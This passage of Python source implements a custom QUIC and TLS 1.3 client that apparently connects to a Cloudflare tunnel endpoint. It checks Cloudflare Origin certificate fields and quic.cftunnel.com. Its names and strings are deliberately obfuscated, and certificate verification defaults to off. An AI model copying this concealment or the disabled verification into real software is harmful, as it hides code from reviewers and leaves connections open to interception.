    O0_var_1178 = [{codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape'): O0_var_1174 - O0_var_1177, codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'): O0_var_1177 + 1}]
    O0_var_1179 = O0_var_1174 - O0_var_1177
    for O0_var_1180 in range(O0_var_1176):
        O0_var_1181 = O0_var_1173[codecs.decode('\\u006e\\u0075\\u006d\\u0062\\u0065\\u0072', 'unicode_escape')](O0_var_1173)
        O0_var_1182 = O0_var_1173[codecs.decode('\\u006e\\u0075\\u006d\\u0062\\u0065\\u0072', 'unicode_escape')](O0_var_1173)
        O0_var_1183 = O0_var_1179 - O0_var_1181 - 2
        O0_var_1178.append({codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape'): O0_var_1183 - O0_var_1182, codecs.decode('\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'): O0_var_1182 + 1})
        O0_var_1179 = O0_var_1183 - O0_var_1182
    O0_var_1178.append({codecs.decode('\\u0061\\u0063\\u006b\\u005f\\u0064\\u0065\\u006c\\u0061\\u0079', 'unicode_escape'): O0_var_1175 / 1000})
    return O0_var_1178

def _quic_decode_transport_parameters(O0_var_1184):
    O0_var_1185 = {}
    O0_var_1186 = 0
    while O0_var_1186 < len(O0_var_1184):
        O0_var_1187 = O0_fn_33(O0_var_1184, O0_var_1186)
        if O0_var_1187 is None:
            break
        O0_var_1188, O0_var_1186 = (O0_var_1187[0], O0_var_1186 + O0_var_1187[1])
        O0_var_1187 = O0_fn_33(O0_var_1184, O0_var_1186)
        if O0_var_1187 is None:
            break
        O0_var_1189, O0_var_1186 = (O0_var_1187[0], O0_var_1186 + O0_var_1187[1])
        if len(O0_var_1184) - O0_var_1186 < O0_var_1189:
            break
        O0_var_1190 = O0_var_1184[O0_var_1186:O0_var_1186 + O0_var_1189]
        O0_var_1186 += O0_var_1189
        if O0_var_1189 in (1, 2, 4, 8):
            O0_var_1187 = 0
            for O0_var_1191 in O0_var_1190:
                O0_var_1187 = O0_var_1187 * 256 + O0_var_1191
            O0_var_1185[O0_var_1188] = O0_var_1187
        else:
            O0_var_1185[O0_var_1188] = bytes(O0_var_1190)
    return O0_var_1185

def _quic_encode_transport_parameters(entries):
    O0_var_1192 = bytearray()
    for O0_var_1193, O0_var_1194 in entries:
        if isinstance(O0_var_1194, (bytes, bytearray)):
            O0_var_1195 = bytes(O0_var_1194)
        elif O0_var_1194 is True:
            O0_var_1195 = b''
        else:
            O0_var_1195 = O0_fn_32(O0_var_1194)
        O0_var_1192 += O0_fn_32(O0_var_1193)
        O0_var_1192 += O0_fn_32(len(O0_var_1195))
        O0_var_1192 += O0_var_1195
    return bytes(O0_var_1192)

class QuicTlsClient:

    def __init__(self, server_name, alpn, O0_var_1196):
        from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey
        from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
        self.server_name = server_name
        self.alpn = alpn
        self.parameters = O0_var_1196
        self.key_pair = X25519PrivateKey.generate()
        self.public_key = self.key_pair.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw)
        self.hash = codecs.decode('\\u0073\\u0068\\u0061\\u0032\\u0035\\u0036', 'unicode_escape')
        self.hash_length = 32
        self.cipher = codecs.decode('\\u0061\\u0065\\u0073\\u002d\\u0031\\u0032\\u0038\\u002d\\u0067\\u0063\\u006d', 'unicode_escape')
        self.messages = []
        self.state = codecs.decode('\\u0073\\u0074\\u0061\\u0072\\u0074', 'unicode_escape')
        self.remote_parameters = None
        self.negotiated_alpn = None
        self.leaf_cert = None

    def transcript(self, limit=None):
        O0_var_1197 = hashlib.new(self.hash)
        for O0_var_1198 in self.messages if limit is None else self.messages[:limit]:
            O0_var_1197.update(O0_var_1198)
        return O0_var_1197.digest()

    def build_client_hello(self):
        O0_var_1199 = self.server_name.encode()
        O0_var_1200 = (len(O0_var_1199) + 3).to_bytes(2, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) + b'\x00' + len(O0_var_1199).to_bytes(2, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) + O0_var_1199
        O0_var_1201 = 4 .to_bytes(2, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) + 29 .to_bytes(2, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) + 23 .to_bytes(2, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
        O0_var_1202 = 8 .to_bytes(2, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) + 1027 .to_bytes(2, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) + 2052 .to_bytes(2, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) + 1025 .to_bytes(2, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) + 2055 .to_bytes(2, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
        O0_var_1203 = b'\x02' + 772 .to_bytes(2, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
        O0_var_1204 = (4 + len(self.public_key)).to_bytes(2, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) + 29 .to_bytes(2, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) + len(self.public_key).to_bytes(2, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) + self.public_key
        O0_var_1205 = bytes([len(self.alpn)]) + self.alpn.encode()
        O0_var_1206 = len(O0_var_1205).to_bytes(2, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) + O0_var_1205
        O0_var_1207 = b'\x01\x01'

        def ext(O0_var_1208, body):
            return O0_var_1208.to_bytes(2, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) + len(body).to_bytes(2, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) + body
        O0_var_1209 = b''.join([ext(0, O0_var_1200), ext(10, O0_var_1201), ext(13, O0_var_1202), ext(43, O0_var_1203), ext(51, O0_var_1204), ext(16, O0_var_1206), ext(45, O0_var_1207), ext(65281, b'\x00'), ext(57, self.parameters)])
        O0_var_1210 = bytes([0, 4, 19, 1, 19, 2])
        O0_var_1211 = bytes([3, 3]) + secrets.token_bytes(32) + b'\x00' + O0_var_1210 + bytes([1, 0]) + len(O0_var_1209).to_bytes(2, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) + O0_var_1209
        O0_var_1212 = bytes([1]) + len(O0_var_1211).to_bytes(3, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) + O0_var_1211
        self.messages.append(O0_var_1212)
        self.state = codecs.decode('\\u0061\\u0077\\u0061\\u0069\\u0074\\u0069\\u006e\\u0067\\u002d\\u0073\\u0065\\u0072\\u0076\\u0065\\u0072\\u002d\\u0068\\u0065\\u006c\\u006c\\u006f', 'unicode_escape')
        return O0_var_1212

    def server_hello_complete(self, O0_var_1213):
        if len(O0_var_1213) < 4:
            return None
        if O0_var_1213[0] != 2:
            raise ValueError(codecs.decode('\\u0065\\u0078\\u0070\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0054\\u004c\\u0053\\u0020\\u0053\\u0065\\u0072\\u0076\\u0065\\u0072\\u0048\\u0065\\u006c\\u006c\\u006f', 'unicode_escape'))
        O0_var_1214 = int.from_bytes(O0_var_1213[1:4], codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
        if len(O0_var_1213) < 4 + O0_var_1214:
            return None
        return O0_var_1213[:4 + O0_var_1214]

    def handle_server_hello(self, message):
        from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PublicKey
        from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
        O0_var_1215 = message[4:]
        O0_var_1216 = 2
        O0_var_1217 = O0_var_1215[O0_var_1216:O0_var_1216 + 32]
        O0_var_1216 += 32
        if O0_var_1217 == QUIC_HRR_RANDOM:
            raise ValueError(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0065\\u0064\\u0020\\u0061\\u0020\\u0048\\u0065\\u006c\\u006c\\u006f\\u0052\\u0065\\u0074\\u0072\\u0079\\u0052\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u002c\\u0020\\u0077\\u0068\\u0069\\u0063\\u0068\\u0020\\u0069\\u0073\\u0020\\u006e\\u006f\\u0074\\u0020\\u0073\\u0075\\u0070\\u0070\\u006f\\u0072\\u0074\\u0065\\u0064', 'unicode_escape'))
        O0_var_1218 = O0_var_1215[O0_var_1216]
        O0_var_1216 += 1 + O0_var_1218
        O0_var_1219 = int.from_bytes(O0_var_1215[O0_var_1216:O0_var_1216 + 2], codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
        O0_var_1216 += 2
        O0_var_1216 += 1
        O0_var_1220 = int.from_bytes(O0_var_1215[O0_var_1216:O0_var_1216 + 2], codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
        O0_var_1216 += 2
        O0_var_1221 = None
        O0_var_1222 = 0
        while O0_var_1222 < O0_var_1220 and len(O0_var_1215) - O0_var_1216 >= 4:
            O0_var_1223 = int.from_bytes(O0_var_1215[O0_var_1216:O0_var_1216 + 2], codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
            O0_var_1224 = int.from_bytes(O0_var_1215[O0_var_1216 + 2:O0_var_1216 + 4], codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
            O0_var_1225 = O0_var_1215[O0_var_1216 + 4:O0_var_1216 + 4 + O0_var_1224]
            O0_var_1216 += 4 + O0_var_1224
            O0_var_1222 += 1
            if O0_var_1223 == 51 and len(O0_var_1225) >= 4:
                O0_var_1226 = int.from_bytes(O0_var_1225[:2], codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
                O0_var_1227 = int.from_bytes(O0_var_1225[2:4], codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
                O0_var_1221 = {codecs.decode('\\u0067\\u0072\\u006f\\u0075\\u0070', 'unicode_escape'): O0_var_1226, codecs.decode('\\u006b\\u0065\\u0079', 'unicode_escape'): O0_var_1225[4:4 + O0_var_1227]}
            elif O0_var_1223 == 43 and len(O0_var_1225) >= 2:
                if int.from_bytes(O0_var_1225[:2], codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) != 772:
                    raise ValueError(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0073\\u0065\\u006c\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0061\\u006e\\u0020\\u0075\\u006e\\u0073\\u0075\\u0070\\u0070\\u006f\\u0072\\u0074\\u0065\\u0064\\u0020\\u0054\\u004c\\u0053\\u0020\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'))
        if O0_var_1221 is None:
            raise ValueError(codecs.decode('\\u0053\\u0065\\u0072\\u0076\\u0065\\u0072\\u0048\\u0065\\u006c\\u006c\\u006f\\u0020\\u0068\\u0061\\u0073\\u0020\\u006e\\u006f\\u0020\\u006b\\u0065\\u0079\\u005f\\u0073\\u0068\\u0061\\u0072\\u0065', 'unicode_escape'))
        if O0_var_1221[codecs.decode('\\u0067\\u0072\\u006f\\u0075\\u0070', 'unicode_escape')] != 29:
            raise ValueError(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0073\\u0065\\u006c\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0075\\u006e\\u0073\\u0075\\u0070\\u0070\\u006f\\u0072\\u0074\\u0065\\u0064\\u0020\\u006b\\u0065\\u0079\\u0020\\u0073\\u0068\\u0061\\u0072\\u0065\\u0020\\u0067\\u0072\\u006f\\u0075\\u0070\\u0020\\u0025\\u0064', 'unicode_escape') % O0_var_1221[codecs.decode('\\u0067\\u0072\\u006f\\u0075\\u0070', 'unicode_escape')])
        if O0_var_1219 == 4865:
            self.hash, self.hash_length, self.cipher = (codecs.decode('\\u0073\\u0068\\u0061\\u0032\\u0035\\u0036', 'unicode_escape'), 32, codecs.decode('\\u0061\\u0065\\u0073\\u002d\\u0031\\u0032\\u0038\\u002d\\u0067\\u0063\\u006d', 'unicode_escape'))
        elif O0_var_1219 == 4866:
            self.hash, self.hash_length, self.cipher = (codecs.decode('\\u0073\\u0068\\u0061\\u0033\\u0038\\u0034', 'unicode_escape'), 48, codecs.decode('\\u0061\\u0065\\u0073\\u002d\\u0032\\u0035\\u0036\\u002d\\u0067\\u0063\\u006d', 'unicode_escape'))
        else:
            raise ValueError(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0073\\u0065\\u006c\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0075\\u006e\\u0073\\u0075\\u0070\\u0070\\u006f\\u0072\\u0074\\u0065\\u0064\\u0020\\u0063\\u0069\\u0070\\u0068\\u0065\\u0072\\u0020\\u0073\\u0075\\u0069\\u0074\\u0065\\u0020\\u0025\\u0030\\u0034\\u0078', 'unicode_escape') % O0_var_1219)
        self.messages.append(message)
        O0_var_1228 = self.key_pair.exchange(X25519PublicKey.from_public_bytes(O0_var_1221[codecs.decode('\\u006b\\u0065\\u0079', 'unicode_escape')]))
        O0_var_1229 = bytes(self.hash_length)
        O0_var_1230 = _hkdf_extract(self.hash, O0_var_1229, O0_var_1229)
        O0_var_1231 = O0_fn_34(self.hash, O0_var_1230, codecs.decode('\\u0064\\u0065\\u0072\\u0069\\u0076\\u0065\\u0064', 'unicode_escape'), hashlib.new(self.hash).digest(), self.hash_length)
        self.handshake_secret = _hkdf_extract(self.hash, O0_var_1231, O0_var_1228)
        O0_var_1232 = self.transcript()
        self.client_handshake_secret = O0_fn_34(self.hash, self.handshake_secret, codecs.decode('\\u0063\\u0020\\u0068\\u0073\\u0020\\u0074\\u0072\\u0061\\u0066\\u0066\\u0069\\u0063', 'unicode_escape'), O0_var_1232, self.hash_length)
        self.server_handshake_secret = O0_fn_34(self.hash, self.handshake_secret, codecs.decode('\\u0073\\u0020\\u0068\\u0073\\u0020\\u0074\\u0072\\u0061\\u0066\\u0066\\u0069\\u0063', 'unicode_escape'), O0_var_1232, self.hash_length)
        self.state = codecs.decode('\\u0061\\u0077\\u0061\\u0069\\u0074\\u0069\\u006e\\u0067\\u002d\\u0068\\u0061\\u006e\\u0064\\u0073\\u0068\\u0061\\u006b\\u0065', 'unicode_escape')
        return {codecs.decode('\\u0073\\u0065\\u006e\\u0064', 'unicode_escape'): QuicKeys(self.hash, self.cipher, self.client_handshake_secret), codecs.decode('\\u0072\\u0065\\u0063\\u0076', 'unicode_escape'): QuicKeys(self.hash, self.cipher, self.server_handshake_secret)}

    def handle_handshake_message(self, message):
        self.messages.append(message)
        O0_var_1233 = message[0]
        if O0_var_1233 == 8:
            O0_var_1234 = message[4:]
            O0_var_1235 = 2
            O0_var_1236 = int.from_bytes(O0_var_1234[:2], codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
            O0_var_1237 = 0
            while O0_var_1237 < O0_var_1236 and len(O0_var_1234) - O0_var_1235 >= 4:
                O0_var_1238 = int.from_bytes(O0_var_1234[O0_var_1235:O0_var_1235 + 2], codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
                O0_var_1239 = int.from_bytes(O0_var_1234[O0_var_1235 + 2:O0_var_1235 + 4], codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
                O0_var_1240 = O0_var_1234[O0_var_1235 + 4:O0_var_1235 + 4 + O0_var_1239]
                O0_var_1235 += 4 + O0_var_1239
                O0_var_1237 += 1
                if O0_var_1238 == 57:
                    self.remote_parameters = _quic_decode_transport_parameters(O0_var_1240)
                elif O0_var_1238 == 16 and len(O0_var_1240) >= 3:
                    self.negotiated_alpn = O0_var_1240[3:].decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))
            return None
        if O0_var_1233 == 11:
            O0_var_1234 = message[4:]
            if len(O0_var_1234) >= 4:
                O0_var_1235 = 1 + O0_var_1234[0]
                if O0_var_1235 + 3 <= len(O0_var_1234):
                    O0_var_1241 = int.from_bytes(O0_var_1234[O0_var_1235:O0_var_1235 + 3], codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
                    if O0_var_1235 + 3 + O0_var_1241 <= len(O0_var_1234) and O0_var_1241 >= 3:
                        O0_var_1242 = int.from_bytes(O0_var_1234[O0_var_1235 + 3:O0_var_1235 + 6], codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
                        if O0_var_1242 > 0 and O0_var_1235 + 6 + O0_var_1242 <= len(O0_var_1234):
                            self.leaf_cert = bytes(O0_var_1234[O0_var_1235 + 6:O0_var_1235 + 6 + O0_var_1242])
            return None
        if O0_var_1233 in (15, 4):
            return None
        if O0_var_1233 != 20:
            return None
        O0_var_1243 = self.messages[-1]
        O0_var_1244 = O0_var_1243[4:]
        O0_var_1245 = self.transcript(len(self.messages) - 1)
        O0_var_1246 = O0_fn_34(self.hash, self.server_handshake_secret, codecs.decode('\\u0066\\u0069\\u006e\\u0069\\u0073\\u0068\\u0065\\u0064', 'unicode_escape'), b'', self.hash_length)
        O0_var_1247 = hmac.new(O0_var_1246, O0_var_1245, self.hash).digest()
        O0_var_1248 = len(O0_var_1247) == len(O0_var_1244) and hmac.compare_digest(O0_var_1247, O0_var_1244)
        O0_var_1249 = O0_fn_34(self.hash, self.client_handshake_secret, codecs.decode('\\u0066\\u0069\\u006e\\u0069\\u0073\\u0068\\u0065\\u0064', 'unicode_escape'), b'', self.hash_length)
        O0_var_1250 = hmac.new(O0_var_1249, self.transcript(), self.hash).digest()
        O0_var_1251 = bytes([20]) + len(O0_var_1250).to_bytes(3, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) + O0_var_1250
        O0_var_1252 = bytes(self.hash_length)
        O0_var_1253 = O0_fn_34(self.hash, self.handshake_secret, codecs.decode('\\u0064\\u0065\\u0072\\u0069\\u0076\\u0065\\u0064', 'unicode_escape'), hashlib.new(self.hash).digest(), self.hash_length)
        O0_var_1254 = _hkdf_extract(self.hash, O0_var_1253, O0_var_1252)
        O0_var_1255 = self.transcript()
        self.messages.append(O0_var_1251)
        O0_var_1256 = O0_fn_34(self.hash, O0_var_1254, codecs.decode('\\u0063\\u0020\\u0061\\u0070\\u0020\\u0074\\u0072\\u0061\\u0066\\u0066\\u0069\\u0063', 'unicode_escape'), O0_var_1255, self.hash_length)
        O0_var_1257 = O0_fn_34(self.hash, O0_var_1254, codecs.decode('\\u0073\\u0020\\u0061\\u0070\\u0020\\u0074\\u0072\\u0061\\u0066\\u0066\\u0069\\u0063', 'unicode_escape'), O0_var_1255, self.hash_length)
        self.state = codecs.decode('\\u0063\\u006f\\u006d\\u0070\\u006c\\u0065\\u0074\\u0065', 'unicode_escape')
        return {codecs.decode('\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0065\\u0064', 'unicode_escape'): O0_var_1248, codecs.decode('\\u0066\\u0069\\u006e\\u0069\\u0073\\u0068\\u0065\\u0064', 'unicode_escape'): O0_var_1251, codecs.decode('\\u0073\\u0065\\u006e\\u0064', 'unicode_escape'): QuicKeys(self.hash, self.cipher, O0_var_1256), codecs.decode('\\u0072\\u0065\\u0063\\u0076', 'unicode_escape'): QuicKeys(self.hash, self.cipher, O0_var_1257)}

def O0_fn_38(O0_var_1258):
    if not O0_var_1258:
        return codecs.decode('\\u006e\\u006f\\u0020\\u0065\\u0064\\u0067\\u0065\\u0020\\u0063\\u0065\\u0072\\u0074\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0065\\u0020\\u0069\\u006e\\u0020\\u0054\\u004c\\u0053\\u0020\\u0068\\u0061\\u006e\\u0064\\u0073\\u0068\\u0061\\u006b\\u0065', 'unicode_escape')
    from cryptography import x509
    O0_var_1259 = x509.load_der_x509_certificate(O0_var_1258)

    def _attr(name, O0_var_1260):
        O0_var_1261 = name.get_attributes_for_oid(O0_var_1260)
        return O0_var_1261[0].value if O0_var_1261 else None
    O0_var_1262 = _attr(O0_var_1259.issuer, x509.oid.NameOID.ORGANIZATION_NAME)
    O0_var_1263 = _attr(O0_var_1259.issuer, x509.oid.NameOID.ORGANIZATIONAL_UNIT_NAME)
    O0_var_1264 = _attr(O0_var_1259.subject, x509.oid.NameOID.COMMON_NAME)
    if O0_var_1262 != codecs.decode('\\u0043\\u006c\\u006f\\u0075\\u0064\\u0046\\u006c\\u0061\\u0072\\u0065\\u002c\\u0020\\u0049\\u006e\\u0063\\u002e', 'unicode_escape'):
        return codecs.decode('\\u0069\\u0073\\u0073\\u0075\\u0065\\u0072\\u0020\\u004f\\u0020\\u006d\\u0069\\u0073\\u006d\\u0061\\u0074\\u0063\\u0068\\u003a\\u0020\\u0025\\u0072', 'unicode_escape') % O0_var_1262
    if not str(O0_var_1263 or codecs.decode('', 'unicode_escape')).startswith(codecs.decode('\\u0043\\u006c\\u006f\\u0075\\u0064\\u0046\\u006c\\u0061\\u0072\\u0065\\u0020\\u004f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0020\\u0053\\u0053\\u004c', 'unicode_escape')):
        return codecs.decode('\\u0069\\u0073\\u0073\\u0075\\u0065\\u0072\\u0020\\u004f\\u0055\\u0020\\u006d\\u0069\\u0073\\u006d\\u0061\\u0074\\u0063\\u0068\\u003a\\u0020\\u0025\\u0072', 'unicode_escape') % O0_var_1263
    if O0_var_1264 != codecs.decode('\\u0043\\u006c\\u006f\\u0075\\u0064\\u0046\\u006c\\u0061\\u0072\\u0065\\u0020\\u004f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0020\\u0043\\u0065\\u0072\\u0074\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0065', 'unicode_escape'):
        return codecs.decode('\\u0073\\u0075\\u0062\\u006a\\u0065\\u0063\\u0074\\u0020\\u0043\\u004e\\u0020\\u006d\\u0069\\u0073\\u006d\\u0061\\u0074\\u0063\\u0068\\u003a\\u0020\\u0025\\u0072', 'unicode_escape') % O0_var_1264
    try:
        O0_var_1265 = O0_var_1259.extensions.get_extension_for_class(x509.SubjectAlternativeName).value
        O0_var_1266 = O0_var_1265.get_values_for_type(x509.DNSName)
    except x509.ExtensionNotFound:
        O0_var_1266 = []
    O0_var_1267 = codecs.decode('\\u0071\\u0075\\u0069\\u0063\\u002e\\u0063\\u0066\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')
    for O0_var_1268 in O0_var_1266:
        O0_var_1268 = str(O0_var_1268).lower()
        if O0_var_1268 in {O0_var_1267, codecs.decode('\\u0063\\u0066\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')} or (O0_var_1268.startswith(codecs.decode('\\u002a\\u002e', 'unicode_escape')) and O0_var_1267.endswith(O0_var_1268[1:])):
            return None
    return codecs.decode('\\u0053\\u0041\\u004e\\u0020\\u0064\\u006f\\u0065\\u0073\\u0020\\u006e\\u006f\\u0074\\u0020\\u0063\\u006f\\u0076\\u0065\\u0072\\u0020\\u0071\\u0075\\u0069\\u0063\\u002e\\u0063\\u0066\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')

class QuicStream:

    def __init__(self, O0_var_1269, O0_var_1270, O0_var_1271):
        self.connection = O0_var_1269
        self.id = O0_var_1270
        self.initiator = O0_var_1271
        self.send = QuicByteSender(O0_var_1269)
        self.sent_end = 0
        self.recv = b''
        self.receiver = QuicOffsetBuffer()
        self.ended = False
        self.reset = False
        self.consumed = 0
        self.peer_limit = 0
        self.local_limit = O0_var_1269.local_stream_data
        self.user_data = None

    def write(self, O0_var_1272, O0_var_1273=False):
        self.send.append(O0_var_1272, bool(O0_var_1273))
        self.connection.mark_send_ready(self)

class QuicConnection:

    def __init__(self, host, port, logger, server_name=None, alpn=QUIC_ALPN, idle_timeout=30000, verify_certificate=False):
        self.log = logger
        self.host = host
        self.port = port
        self.server_name = server_name or host
        self.alpn = alpn
        self.max_packet = QUIC_MAX_PACKET
        self.idle_timeout = idle_timeout
        self.keep_alive = 1000
        self.max_inflight = 256
        self.local_max_data = 1 << 22
        self.local_stream_data = 1 << 20
        self.verify_certificate = verify_certificate
        self.on_ready = lambda: None
        self.on_stream = lambda stream: None
        self.on_stream_data = lambda stream, data: None
        self.on_stream_end = lambda stream: None
        self.on_close = lambda err: None
        self.our_cid = secrets.token_bytes(8)
        self.peer_cid = secrets.token_bytes(8)
        self.receive_window = 1 << 20
        self._stopped_flag = False
        self.local_parameters = _quic_encode_transport_parameters([(QUIC_PARAM[codecs.decode('\\u006d\\u0061\\u0078\\u005f\\u0069\\u0064\\u006c\\u0065\\u005f\\u0074\\u0069\\u006d\\u0065\\u006f\\u0075\\u0074', 'unicode_escape')], self.idle_timeout), (QUIC_PARAM[codecs.decode('\\u0069\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u005f\\u006d\\u0061\\u0078\\u005f\\u0064\\u0061\\u0074\\u0061', 'unicode_escape')], self.local_max_data), (QUIC_PARAM[codecs.decode('\\u0069\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u005f\\u006d\\u0061\\u0078\\u005f\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u005f\\u0064\\u0061\\u0074\\u0061\\u005f\\u0062\\u0069\\u0064\\u0069\\u005f\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape')], self.local_stream_data), (QUIC_PARAM[codecs.decode('\\u0069\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u005f\\u006d\\u0061\\u0078\\u005f\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u005f\\u0064\\u0061\\u0074\\u0061\\u005f\\u0062\\u0069\\u0064\\u0069\\u005f\\u0072\\u0065\\u006d\\u006f\\u0074\\u0065', 'unicode_escape')], self.local_stream_data), (QUIC_PARAM[codecs.decode('\\u0069\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u005f\\u006d\\u0061\\u0078\\u005f\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u005f\\u0064\\u0061\\u0074\\u0061\\u005f\\u0075\\u006e\\u0069', 'unicode_escape')], self.local_stream_data), (QUIC_PARAM[codecs.decode('\\u0069\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u005f\\u006d\\u0061\\u0078\\u005f\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0073\\u005f\\u0062\\u0069\\u0064\\u0069', 'unicode_escape')], 1 << 24), (QUIC_PARAM[codecs.decode('\\u0069\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u005f\\u006d\\u0061\\u0078\\u005f\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0073\\u005f\\u0075\\u006e\\u0069', 'unicode_escape')], 1 << 24), (QUIC_PARAM[codecs.decode('\\u006d\\u0061\\u0078\\u005f\\u0075\\u0064\\u0070\\u005f\\u0070\\u0061\\u0079\\u006c\\u006f\\u0061\\u0064\\u005f\\u0073\\u0069\\u007a\\u0065', 'unicode_escape')], self.max_packet), (QUIC_PARAM[codecs.decode('\\u0061\\u0063\\u0074\\u0069\\u0076\\u0065\\u005f\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u005f\\u0069\\u0064\\u005f\\u006c\\u0069\\u006d\\u0069\\u0074', 'unicode_escape')], 8), (QUIC_PARAM[codecs.decode('\\u0069\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u005f\\u0073\\u006f\\u0075\\u0072\\u0063\\u0065\\u005f\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u005f\\u0069\\u0064', 'unicode_escape')], self.our_cid)])
        self.tls = QuicTlsClient(self.server_name, self.alpn, self.local_parameters)
        self.sock = None
        self.closed = None
        self.closing = False
        self.close_reason = None
        self.settle = None
        self.handshake_event = threading.Event()
        self.keys = [None, None, None]
        self.app_recv_gens = []
        self.app_send_keys = [None, None]
        self.app_key_phase = 0
        self.pn_send = [0, 0, 0]
        self.largest_recv = [-1, -1, -1]
        self.recv_ranges = [[], [], []]
        self.ack_pending = [False, False, False]
        self.in_flight = [[], [], []]
        self.crypto_send = [QuicByteSender(self) for O0_var_1274 in range(3)]
        self.tls_offsets = [QuicOffsetBuffer() for O0_var_1275 in range(3)]
        self.server_hello = b''
        self.handshake_bytes = b''
        self.streams = {}
        self.send_ready = []
        self.next_local_stream = 0
        self.peer_max_data = 0
        self.peer_stream_remote = 0
        self.peer_stream_local = 0
        self.connection_sent = 0
        self.consumed_total = 0
        self.credit_max_data = False
        self.credit_ready = []
        self.pending_one_off = []
        self.handshake_complete = False
        self.finished_sent = False
        self.confirmed = False
        self.registered = False
        self.registration_failed = False
        self.pto = 250
        self.retransmits = 0
        self.initial_window = 10 * self.max_packet
        self.min_window = 2 * self.max_packet
        self.congestion_window = self.initial_window
        self.slow_start_threshold = float(codecs.decode('\\u0069\\u006e\\u0066', 'unicode_escape'))
        self.max_window = self.max_inflight * self.max_packet
        self.srtt = None
        self.rttvar = None
        self.peer_max_ack_delay = 25
        self.pto_count = 0
        self.k_packet_threshold = 3
        self.last_received = 0.0
        self.last_eliciting = 0.0
        self.ping_pending = False
        self.initial_sent = 0
        self.peer_token = b''
        self.remote_parameters = None
